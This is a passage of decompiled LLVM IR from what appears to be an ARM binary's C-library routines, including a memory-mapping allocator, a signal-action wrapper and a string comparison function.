  %v4_16b28 = inttoptr i32 %v0_16b20 to i8*
  %v5_16b28 = call i32 @function_16f28(i8* %v4_16b28, i32 %v2_16b24, i32 %v3_16adc, i32 %v3_16b18)
  %v2_16b2c = icmp eq i32 %v5_16b28, 0
  br i1 %v2_16b2c, label %dec_label_pc_16b34, label %dec_label_pc_16a5c

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b18, %dec_label_pc_16ac8
  %v0_16b34 = load i32, i32* %r4.global-to-local, align 4
  %v1_16b34 = add i32 %v0_16b34, 4
  %v2_16b34 = inttoptr i32 %v1_16b34 to i32*
  %v3_16b34 = load i32, i32* %v2_16b34, align 4
  %v0_16b38 = load i32, i32* %r5.global-to-local, align 4
  %v2_16b38 = add i32 %v0_16b38, %v3_16b34
  br label %dec_label_pc_16984

; uselistorder directives
  uselistorder i32 %v3_16b18, { 1, 0 }
  uselistorder i32 %v0_16b18, { 0, 1, 4, 5, 3, 2 }
  uselistorder i16 %v3_16aa4, { 1, 0 }
  uselistorder i32 %v3_16a90, { 1, 0 }
  uselistorder i32 %v2_169ec, { 4, 5, 8, 7, 6, 3, 2, 0, 1 }
  uselistorder i32 %v0_16a0c, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16a1848, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16a1c50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a2c53, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a3855, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1695c, { 1, 2, 0 }
  uselistorder i32 %v0_1696c, { 1, 0, 2 }
  uselistorder i32 %v0_16964, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_16904, { 1, 0 }
  uselistorder i32 %v0_16904, { 0, 2, 1 }
  uselistorder i32 %v2_168c4, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 10, 9, 2, 11, 12, 13, 14, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 14, { 17, 0, 1, 18, 9, 3, 4, 5, 6, 7, 10, 11, 8, 12, 13, 14, 15, 2, 16 }
  uselistorder i32 39, { 0, 6, 5, 1, 7, 2, 8, 3, 9, 4 }
  uselistorder i8 16, { 1, 2, 0, 3, 4, 5, 6, 8, 7, 10, 9, 11, 12, 14, 13, 16, 15 }
  uselistorder i32 42, { 3, 2, 0, 4, 1, 5 }
  uselistorder i16 0, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %dec_label_pc_16a5c, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb75, { 5, 3, 0, 2, 6, 4, 1 }
  uselistorder label %dec_label_pc_16984, { 11, 0, 10, 9, 2, 5, 8, 3, 1, 6, 7, 4 }
  uselistorder label %.thread4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1690c, { 1, 0 }
}

define i32 @function_16b44(i32* %arg1) local_unnamed_addr {
dec_label_pc_16b44:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8388636 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_16b44 = load i32, i32* @r6, align 4
  %v12_16b44 = load i32, i32* @r7, align 4
  %v15_16b44 = load i32, i32* @r8, align 4
  %v18_16b44 = load i32, i32* @lr, align 4
  %v2_16b48 = load i32, i32* %arg1, align 4
  store i32 %v2_16b48, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r8, align 4
  %tmp42 = icmp ugt i32 %v2_16b48, 2147479551
  br i1 %tmp42, label %dec_label_pc_16ca8, label %dec_label_pc_16b64

dec_label_pc_16b64:                               ; preds = %dec_label_pc_16b44
  store i32 ptrtoint (i32* @global_var_228ec.653 to i32), i32* @lr, align 4
  %v1_16b68 = sub i32 0, %v2_16b48
  %v2_16b6c = load i32, i32* @global_var_228ec.653, align 4
  store i32 %v2_16b6c, i32* %r0.global-to-local, align 4
  %v3_16b74 = urem i32 %v1_16b68, 4096
  %v2_16b78 = icmp eq i32 %v2_16b6c, 0
  %v2_16b7c = add i32 %v3_16b74, %v2_16b48
  br i1 %v2_16b78, label %dec_label_pc_16c3c, label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b64, %dec_label_pc_16c3c
  %v2_16c84 = phi i32 [ %v2_16b6c, %dec_label_pc_16b64 ], [ 0, %dec_label_pc_16c3c ]
  %v1_16b88 = sub i32 -1, %v2_16c84
  %v3_16b8c = icmp ult i32 %v2_16b7c, %v1_16b88
  br i1 %v3_16b8c, label %dec_label_pc_16b94, label %dec_label_pc_16bc4

dec_label_pc_16b94:                               ; preds = %dec_label_pc_16b84
  %v3_16b98 = load i32, i32* @global_var_22aec.528, align 4
  %v1_16b9c = add i32 %v3_16b98, -8388608
  %v2_16b9c = icmp ugt i32 %v3_16b98, 8388607
  %v7_16b9c = icmp eq i32 %v3_16b98, 8388608
  %v2_16ba0 = xor i1 %v2_16b9c, true
  %v3_16ba0 = or i1 %v7_16b9c, %v2_16ba0
  br i1 %v3_16ba0, label %bb, label %bb31

bb:                                               ; preds = %dec_label_pc_16b94
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_16b94, %bb
  %v0_16bac12 = phi i32 [ %v2_16b48, %dec_label_pc_16b94 ], [ 0, %bb ]
  %v2_16ba4 = xor i1 %v7_16b9c, true
  %v3_16ba4 = and i1 %v2_16b9c, %v2_16ba4
  br i1 %v3_16ba4, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  store i32 %v1_16b9c, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v0_16bac = phi i32 [ %v0_16bac12, %bb31 ], [ %v1_16b9c, %bb32 ]
  %v2_16ba8 = add i32 %v2_16c84, %v2_16b7c
  store i32 %v2_16ba8, i32* %r0.global-to-local, align 4
  %v3_16bac = icmp ult i32 %v0_16bac, %v2_16ba8
  br i1 %v3_16bac, label %bb34, label %bb35

bb34:                                             ; preds = %bb33
  %v4_16bb0 = icmp ult i32 %v2_16c84, %v3_16b98
  store i32 %v3_16b98, i32* %stack_var_-28, align 4
  br i1 %v4_16bb0, label %.thread3, label %dec_label_pc_16c5c

bb35:                                             ; preds = %bb33
  store i32 %v3_16b98, i32* %stack_var_-28, align 4
  br label %dec_label_pc_16c5c

.thread3:                                         ; preds = %bb34
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16bc4

dec_label_pc_16bc4:                               ; preds = %dec_label_pc_16c74, %dec_label_pc_16b84, %.thread3
  store i32 ptrtoint (i32* @global_var_228e8.656 to i32), i32* @r6, align 4
  %v2_16bc8 = load i32, i32* @global_var_228e8.656, align 4
  %v3_16bd0 = udiv i32 %v2_16bc8, 2
  %v6_16bd4 = shl i32 4096, %v3_16bd0
  %v3_16bd8 = icmp uge i32 %v2_16b7c, %v6_16bd4
  %v2_16b7c.v6_16bd4 = select i1 %v3_16bd8, i32 %v2_16b7c, i32 %v6_16bd4
  store i32 %v2_16b7c.v6_16bd4, i32* @r7, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v7_16c0c = call i32 @function_145f8(i32 0, i32 %v2_16b7c.v6_16bd4, i32 3, i32 34, i32 -1, i32 0, i32 0)
  store i32 %v7_16c0c, i32* %r0.global-to-local, align 4
  %v7_16c10 = icmp eq i32 %v7_16c0c, -1
  br i1 %v7_16c10, label %bb38, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_16bc4
  %v1_16c14 = load i32, i32* @r7, align 4
  %v2_16c14 = load i32, i32* @r8, align 4
  %v3_16c14 = inttoptr i32 %v2_16c14 to i32*
  store i32 %v1_16c14, i32* %v3_16c14, align 4
  %v3_16c18 = load i32, i32* @global_var_228e8.656, align 4
  %v2_16c1c = add i32 %v3_16c18, 1
  %v2_16c20 = load i32, i32* @r6, align 4
  %v3_16c20 = inttoptr i32 %v2_16c20 to i32*
  store i32 %v2_16c1c, i32* %v3_16c20, align 4
  store i32 %v7_16c0c, i32* %r2.global-to-local, align 4
  br label %bb39

bb38:                                             ; preds = %dec_label_pc_16bc4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb39

bb39:                                             ; preds = %.thread7, %dec_label_pc_16ca8, %dec_label_pc_16c94, %bb38
  %v0_16c2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_16c2c, i32* %r0.global-to-local, align 4
  store i32 %v9_16b44, i32* @r6, align 4
  store i32 %v12_16b44, i32* @r7, align 4
  store i32 %v15_16b44, i32* @r8, align 4
  store i32 %v18_16b44, i32* @lr, align 4
  ret i32 %v0_16c2c

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16b64
  store i32 0, i32* @global_var_228ec.653, align 4
  br label %dec_label_pc_16b84

dec_label_pc_16c5c:                               ; preds = %bb34, %bb35
  %v2_16c5c = ptrtoint i32* %stack_var_-28 to i32
  %v2_16c60 = icmp ugt i32* %stack_var_-28, inttoptr (i32 8388607 to i32*)
  %v2_16c64 = icmp ne i32* %stack_var_-28, inttoptr (i32 8388608 to i32*)
  %v3_16c64 = and i1 %v2_16c60, %v2_16c64
  br i1 %v3_16c64, label %bb40, label %bb41

bb40:                                             ; preds = %dec_label_pc_16c5c
  %v6_16c64 = ptrtoint i32* %stack_var_-8388636 to i32
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_16c5c, %bb40
  %storemerge = phi i32 [ %v6_16c64, %bb40 ], [ 0, %dec_label_pc_16c5c ]
  %v0_16c68 = phi i32 [ %v6_16c64, %bb40 ], [ 0, %dec_label_pc_16c5c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_16c68 = icmp ult i32 %v0_16c68, %v2_16ba8
  store i32 %v2_16c5c, i32* %stack_var_-28, align 4
  br i1 %v3_16c68, label %dec_label_pc_16c74, label %dec_label_pc_16c94

dec_label_pc_16c74:                               ; preds = %bb41
  %v3_16c74 = icmp ult i32 %v2_16c84, %v2_16c5c
  br i1 %v3_16c74, label %dec_label_pc_16bc4, label %dec_label_pc_16c94

dec_label_pc_16c94:                               ; preds = %dec_label_pc_16c74, %bb41
  store i32 %v2_16c84, i32* %r2.global-to-local, align 4
  store i32 %v2_16b7c, i32* %arg1, align 4
  %v0_16ca0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16ca0, i32* @global_var_228ec.653, align 4
  br label %bb39

dec_label_pc_16ca8:                               ; preds = %dec_label_pc_16b44
  %v0_16ca8 = call i32 @function_12ecc()
  store i32 %v0_16ca8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_16cb4 = inttoptr i32 %v0_16ca8 to i32*
  store i32 12, i32* %v2_16cb4, align 4
  br label %bb39

; uselistorder directives
  uselistorder i32 %v7_16c0c, { 1, 0, 2 }
  uselistorder i1 %v2_16b9c, { 1, 0 }
  uselistorder i32 %v3_16b98, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v2_16c84, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_16b7c, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v2_16b48, { 2, 1, 3, 0, 4 }
  uselistorder i32* %stack_var_-28, { 3, 0, 2, 5, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 5, 4, 6, 7, 1, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 1, 7, 3, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_145f8, { 1, 0 }
  uselistorder i32 34, { 0, 2, 8, 3, 4, 9, 16, 1, 12, 10, 11, 5, 13, 6, 14, 7, 15 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_16c5c, { 1, 0 }
  uselistorder label %bb39, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16bc4, { 0, 2, 1 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_16b84, { 1, 0 }
}

define i32 @function_16cc8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16cc8:
  %v0_16cd8 = load i32, i32* @r3, align 4
  store i32 %v0_16cd8, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @function_16cec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16cec:
  store i32 %arg2, i32* @r3, align 4
  %v0_16cfc = load i32, i32* @r0, align 4
  %v3_16cfc = inttoptr i32 %v0_16cfc to i16*
  %v4_16cfc = call i32 @function_150f0(i16* %v3_16cfc, i32 ptrtoint (i32* @global_var_228f4.658 to i32), i32 8)
  ret i32 %v4_16cfc
}

define i32 @function_16d10() local_unnamed_addr {
dec_label_pc_16d10:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16d10 = load i32, i32* @r4, align 4
  %v6_16d10 = load i32, i32* @r5, align 4
  %v12_16d10 = load i32, i32* @r7, align 4
  %v15_16d10 = load i32, i32* @r8, align 4
  %v18_16d10 = load i32, i32* @lr, align 4
  %v0_16d14 = load i32, i32* @r0, align 4
  store i32 %v0_16d14, i32* @r8, align 4
  %v0_16d20 = load i32, i32* @r1, align 4
  store i32 %v0_16d20, i32* @r7, align 4
  %v0_16d24 = load i32, i32* @r2, align 4
  store i32 %v0_16d24, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_16d14, 65
  br i1 %tmp, label %dec_label_pc_16d40, label %dec_label_pc_16d2c

dec_label_pc_16d2c:                               ; preds = %dec_label_pc_16d10
  %v0_16d2c = call i32 @function_12ecc()
  store i32 -1, i32* @r2, align 4
  %v2_16d38 = inttoptr i32 %v0_16d2c to i32*
  store i32 22, i32* %v2_16d38, align 4
  %v0_16e7c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16e7c

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d10
  %v2_16d40 = icmp eq i32 %v0_16d20, 0
  br i1 %v2_16d40, label %bb, label %dec_label_pc_16d4c

bb:                                               ; preds = %dec_label_pc_16d40
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_16e1c

dec_label_pc_16d4c:                               ; preds = %dec_label_pc_16d40
  %v1_16d4c = inttoptr i32 %v0_16d20 to i32*
  %v2_16d4c = load i32, i32* %v1_16d4c, align 4
  %v7_16d50 = icmp eq i32 %v2_16d4c, 1
  store i1 %v7_16d50, i1* @cpsr_z, align 1
  %tmp31 = or i32 %v2_16d4c, 1
  %tmp32 = icmp eq i32 %tmp31, 1
  br i1 %tmp32, label %dec_label_pc_16ddc, label %dec_label_pc_16d58

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d4c
  %v1_16d58 = add i32 %v0_16d14, -1
  %v1_16d5c = urem i32 %v1_16d58, 32
  %v6_16d64 = shl i32 1, %v1_16d5c
  store i32 %v6_16d64, i32* %r5.global-to-local, align 4
  %v3_16d6c = udiv i32 %v1_16d58, 32
  %v4_16d70 = mul nuw nsw i32 %v3_16d6c, 4
  %v5_16d70 = add i32 %v4_16d70, ptrtoint (i32* @global_var_228f4.658 to i32)
  store i32 %v5_16d70, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16d74

dec_label_pc_16d74:                               ; preds = %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge, %dec_label_pc_16d58
  %v1_16d7c = phi i32 [ %v1_16d7c.pre, %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge ], [ %v6_16d64, %dec_label_pc_16d58 ]
  %v0_16d74 = phi i32 [ %v0_16d74.pre, %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge ], [ %v5_16d70, %dec_label_pc_16d58 ]
  %v1_16d74 = inttoptr i32 %v0_16d74 to i32*
  %v2_16d74 = load i32, i32* %v1_16d74, align 4
  %v2_16d7c = or i32 %v2_16d74, %v1_16d7c
  %v4_16d80 = call i32 @function_15cec(i32 %v2_16d74, i32 %v2_16d7c, i32* %v1_16d74)
  %v2_16d84 = icmp eq i32 %v4_16d80, 0
  store i1 %v2_16d84, i1* @cpsr_z, align 1
  br i1 %v2_16d84, label %dec_label_pc_16d8c, label %dec_label_pc_16d74.dec_label_pc_16d74_crit_edge

dec_label_pc_16d74.dec_label_pc_16d74_crit_edge:  ; preds = %dec_label_pc_16d74
  %v0_16d74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16d7c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16d74

dec_label_pc_16d8c:                               ; preds = %dec_label_pc_16d74
  %v3_16d90 = load i32, i32* @global_var_22ae0.661, align 4
  %v2_16d94 = icmp eq i32 %v3_16d90, 0
  br i1 %v2_16d94, label %dec_label_pc_16d9c, label %dec_label_pc_16ddc

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d8c
  store i32 ptrtoint (i32* @global_var_228f0.663 to i32), i32* %r4.global-to-local, align 4
  %v2_16da0 = load i32, i32* @global_var_228f0.663, align 4
  %v2_16da4 = icmp eq i32 %v2_16da0, 0
  br i1 %v2_16da4, label %dec_label_pc_16dac, label %dec_label_pc_16ddc

dec_label_pc_16dac:                               ; preds = %dec_label_pc_16d9c
  store i32 0, i32* @r3, align 4
  %v2_16dc4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_16dc4, i32* @r2, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v2_16dd0 = call i32 @function_16cc8(i32 175, i32 1)
  %v1_16dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_16dd8 = inttoptr i32 %v1_16dd8 to i32*
  store i32 1, i32* %v2_16dd8, align 4
  br label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16d9c, %dec_label_pc_16d8c, %dec_label_pc_16d4c, %dec_label_pc_16dac
  %v0_16ddc = load i32, i32* @r7, align 4
  %v1_16ddc = add i32 %v0_16ddc, 132
  %v2_16ddc = inttoptr i32 %v1_16ddc to i32*
  %v3_16ddc = load i32, i32* %v2_16ddc, align 4
  store i32 94472, i32* @r3, align 4
  store i32 94464, i32* @ip, align 4
  %v1_16de8 = inttoptr i32 %v0_16ddc to i32*
  %v2_16de8 = load i32, i32* %v1_16de8, align 4
  store i32 %v2_16de8, i32* @r5, align 4
  %v1_16dec = and i32 %v3_16ddc, 4
  %v2_16dec = icmp eq i32 %v1_16dec, 0
  %v2_16df0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_16df0, i32* @r4, align 4
  br i1 %v2_16dec, label %bb25, label %bb24

bb24:                                             ; preds = %dec_label_pc_16ddc
  store i32 94472, i32* @ip, align 4
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_16ddc, %bb24
  %v1_16df8 = or i32 %v3_16ddc, 67108864
  store i32 %v1_16df8, i32* @lr, align 4
  %v1_16e00 = add i32 %v0_16ddc, 4
  store i32 %v2_16de8, i32* %stack_var_-52, align 4
  %v3_16e14 = bitcast i32* %stack_var_-40 to i16*
  %v4_16e14 = call i32 @function_150f0(i16* %v3_16e14, i32 %v1_16e00, i32 8)
  store i32 %v2_16df0, i32* @r2, align 4
  %v0_16e1c.pre = load i32, i32* @r6, align 4
  %v0_16e28.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %bb, %bb25
  %v0_16e28 = phi i32 [ %v0_16d14, %bb ], [ %v0_16e28.pre, %bb25 ]
  %v1_16e20 = phi i32 [ %v0_16d24, %bb ], [ %v0_16e1c.pre, %bb25 ]
  %v2_16e1c = icmp eq i32 %v1_16e20, 0
  %v3_16e24 = ptrtoint i32* %stack_var_-72 to i32
  %storemerge = select i1 %v2_16e1c, i32 0, i32 %v3_16e24
  store i32 %storemerge, i32* @r3, align 4
  store i32 8, i32* @r5, align 4
  %v2_16e38 = call i32 @function_16cc8(i32 174, i32 %v0_16e28)
  store i32 %v2_16e38, i32* @r0, align 4
  %v0_16e3c = call i32 @function_13178()
  store i32 %v0_16e3c, i32* @r4, align 4
  %v2_16e40 = icmp eq i32 %v0_16e3c, 0
  br i1 %v2_16e40, label %dec_label_pc_16e4c, label %bb28

bb28:                                             ; preds = %dec_label_pc_16e1c
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_16e7c

dec_label_pc_16e4c:                               ; preds = %dec_label_pc_16e1c
  %v0_16e4c = load i32, i32* @r6, align 4
  %v2_16e4c = icmp eq i32 %v0_16e4c, 0
  br i1 %v2_16e4c, label %bb29, label %dec_label_pc_16e58

bb29:                                             ; preds = %dec_label_pc_16e4c
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_16e7c

dec_label_pc_16e58:                               ; preds = %dec_label_pc_16e4c
  %v3_16e5c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_16e5c, i32* @r3, align 4
  %v1_16e60 = add i32 %v0_16e4c, 4
  %v2_16e64 = add i32 %v0_16e4c, 132
  %v3_16e64 = inttoptr i32 %v2_16e64 to i32*
  %v0_16e68 = load i32, i32* @r3, align 4
  %v1_16e68 = load i32, i32* @r6, align 4
  %v2_16e68 = inttoptr i32 %v1_16e68 to i32*
  store i32 %v0_16e68, i32* %v2_16e68, align 4
  %v0_16e6c = load i32, i32* @r5, align 4
  %v2_16e70 = ptrtoint i32* %stack_var_-60 to i32
  %v3_16e74 = inttoptr i32 %v1_16e60 to i16*
  %v4_16e74 = call i32 @function_150f0(i16* %v3_16e74, i32 %v2_16e70, i32 %v0_16e6c)
  %v0_16e78 = load i32, i32* @r4, align 4
  store i32 %v0_16e78, i32* @r2, align 4
  br label %dec_label_pc_16e7c

dec_label_pc_16e7c:                               ; preds = %bb29, %bb28, %dec_label_pc_16d2c, %dec_label_pc_16e58
  %v0_16e7c = phi i32 [ -1, %bb28 ], [ 0, %bb29 ], [ %v0_16e7c.pre, %dec_label_pc_16d2c ], [ %v0_16e78, %dec_label_pc_16e58 ]
  store i32 %v3_16d10, i32* %r4.global-to-local, align 4
  store i32 %v6_16d10, i32* %r5.global-to-local, align 4
  store i32 %v12_16d10, i32* @r7, align 4
  store i32 %v15_16d10, i32* @r8, align 4
  store i32 %v18_16d10, i32* @lr, align 4
  ret i32 %v0_16e7c

; uselistorder directives
  uselistorder i32 %v0_16e4c, { 1, 0, 2 }
  uselistorder i32 %v2_16d74, { 1, 0 }
  uselistorder i32 %v0_16d14, { 1, 2, 0, 3 }
  uselistorder i32 174, { 1, 0 }
  uselistorder i32 (i16*, i32, i32)* @function_150f0, { 3, 4, 0, 11, 9, 7, 8, 1, 2, 6, 5, 10 }
  uselistorder i32 (i32, i32)* @function_16cc8, { 1, 0 }
  uselistorder label %dec_label_pc_16e7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16e1c, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_16ddc, { 3, 0, 1, 2 }
}

define i32 @function_16ea0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_16ea0:
  store i32 %arg1, i32* @r0, align 4
  %v1_16ea4 = add i32 %arg1, -32
  %tmp = icmp ult i32 %v1_16ea4, 3
  br i1 %tmp, label %dec_label_pc_16ec0, label %dec_label_pc_16eb4

dec_label_pc_16eb4:                               ; preds = %dec_label_pc_16ea0
  %v0_16ebc = call i32 @function_16d10()
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16ea0, %dec_label_pc_16eb4
  %v0_16ec0 = call i32 @function_12ecc()
  %v2_16ec8 = inttoptr i32 %v0_16ec0 to i32*
  store i32 22, i32* %v2_16ec8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 22, { 1, 2, 4, 3, 0, 18, 5, 20, 6, 7, 14, 8, 15, 9, 16, 10, 17, 19, 11, 12, 13, 21 }
  uselistorder i32 ()* @function_12ecc, { 37, 36, 18, 30, 29, 28, 27, 26, 38, 35, 34, 17, 16, 15, 14, 25, 13, 12, 4, 31, 24, 23, 22, 21, 20, 11, 10, 9, 33, 32, 19, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16ec0, { 1, 0 }
}

define i32 @function_16edc(i32 %arg1) local_unnamed_addr {
dec_label_pc_16edc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  store i32 %arg1, i32* @r4, align 4
  %v0_16ee8 = call i32 @function_17110()
  store i32 %v0_16ee8, i32* %r0.global-to-local, align 4
  %v2_16eec = icmp eq i32 %v0_16ee8, 0
  br i1 %v2_16eec, label %dec_label_pc_16ef4, label %dec_label_pc_16f1c

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16edc
  %v0_16ef4 = load i32, i32* @r4, align 4
  store i32 %v0_16ef4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v1_16f00 = add i32 %v0_16ef4, 32
  %v2_16f00 = inttoptr i32 %v1_16f00 to i32*
  %v3_16f00 = load i32, i32* %v2_16f00, align 4
  store i32 %v3_16f00, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_16f00)
  %v0_16f0c = load i32, i32* %r0.global-to-local, align 4
  %v7_16f0c = icmp eq i32 %v0_16f0c, 1
  br i1 %v7_16f0c, label %bb, label %dec_label_pc_16f1c

bb:                                               ; preds = %dec_label_pc_16ef4
  %v4_16f10 = load i8, i8* %stack_var_-9, align 1
  %v5_16f10 = sext i8 %v4_16f10 to i32
  br label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %dec_label_pc_16edc, %dec_label_pc_16ef4, %bb
  %storemerge = phi i32 [ %v5_16f10, %bb ], [ -1, %dec_label_pc_16ef4 ], [ -1, %dec_label_pc_16edc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_16f1c, { 2, 1, 0 }
}

define i32 @function_16f28(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16f28:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_16f2c = inttoptr i32 %arg2 to i8*
  %v2_16f2c = load i8, i8* %v1_16f2c, align 1
  %v3_16f2c = zext i8 %v2_16f2c to i32
  %v3_16f30 = load i8, i8* %arg1, align 1
  %v4_16f30 = zext i8 %v3_16f30 to i32
  %v9_16f34 = icmp eq i8 %v2_16f2c, %v3_16f30
  br i1 %v9_16f34, label %dec_label_pc_16f50, label %dec_label_pc_16f58

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f50
  %v1_16f40 = add i32 %v0_16f40, 1
  %v2_16f40 = inttoptr i32 %v1_16f40 to i8*
  %v3_16f40 = load i8, i8* %v2_16f40, align 1
  %v4_16f40 = zext i8 %v3_16f40 to i32
  %v1_16f44 = add i32 %v0_16f44, 1
  %v2_16f44 = inttoptr i32 %v1_16f44 to i8*
  %v3_16f44 = load i8, i8* %v2_16f44, align 1
  %v4_16f44 = zext i8 %v3_16f44 to i32
  %v9_16f48 = icmp eq i8 %v3_16f40, %v3_16f44
  br i1 %v9_16f48, label %dec_label_pc_16f50, label %dec_label_pc_16f58

dec_label_pc_16f50:                               ; preds = %dec_label_pc_16f28, %dec_label_pc_16f40
  %v0_16f50 = phi i32 [ %v4_16f40, %dec_label_pc_16f40 ], [ %v3_16f2c, %dec_label_pc_16f28 ]
  %v1_16f589 = phi i32 [ %v4_16f40, %dec_label_pc_16f40 ], [ %v4_16f30, %dec_label_pc_16f28 ]
  %v0_16f44 = phi i32 [ %v1_16f44, %dec_label_pc_16f40 ], [ %tmp, %dec_label_pc_16f28 ]
  %v0_16f40 = phi i32 [ %v1_16f40, %dec_label_pc_16f40 ], [ %arg2, %dec_label_pc_16f28 ]
  %v2_16f50 = icmp eq i32 %v0_16f50, 0
  br i1 %v2_16f50, label %dec_label_pc_16f58, label %dec_label_pc_16f40

dec_label_pc_16f58:                               ; preds = %dec_label_pc_16f40, %dec_label_pc_16f50, %dec_label_pc_16f28
  %v1_16f58 = phi i32 [ %v4_16f30, %dec_label_pc_16f28 ], [ %v4_16f44, %dec_label_pc_16f40 ], [ %v1_16f589, %dec_label_pc_16f50 ]
  %v0_16f58 = phi i32 [ %v3_16f2c, %dec_label_pc_16f28 ], [ %v4_16f40, %dec_label_pc_16f40 ], [ 0, %dec_label_pc_16f50 ]
  %v2_16f58 = sub nsw i32 %v1_16f58, %v0_16f58
  ret i32 %v2_16f58

; uselistorder directives
  uselistorder i32 %v4_16f40, { 0, 2, 1 }
  uselistorder i32 %v4_16f30, { 1, 0 }
  uselistorder i32 %v3_16f2c, { 1, 0 }
  uselistorder label %dec_label_pc_16f58, { 1, 0, 2 }
